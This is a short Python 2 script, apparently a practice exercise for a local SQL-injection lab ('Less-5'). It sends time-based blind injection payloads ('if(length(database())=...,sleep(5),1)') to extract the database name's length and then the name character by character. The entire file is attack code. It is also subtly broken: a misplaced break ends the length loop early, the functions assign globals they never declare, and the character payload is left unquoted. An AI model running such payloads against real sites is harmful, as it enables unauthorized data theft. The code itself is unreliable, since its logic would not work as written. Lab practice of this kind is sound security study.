#coding=utf-8

#sqli_9

import requests
import time
url = "http://localhost/SQLdemo2/Less-5/?id=1"

db_name = ""
db_length = 0

def getDbLength():
	for i in range(10):
		payload = "' and if(length(database())=%d,sleep(5),1)"%i
		start_time = time.time()
		req = requests.get(url+payload)
		stay_time = time.time() - start_time
		if stay_time > 5:
			db_length = i
			print "db_length:",db_length
		break
def getDbName():
	for i in range(db_length):
		for j in range(95,200):
			payload = "' and if(left(database(),%d)=%s,sleep(5),1)"%(i,db_name+chr(j))
			start_time = time.time()
			req = requests.get(url+payload)
			stay_time = time.time() - start_time
			if stay_time > 5:
				db_name+=chr(j)
	return db_name
			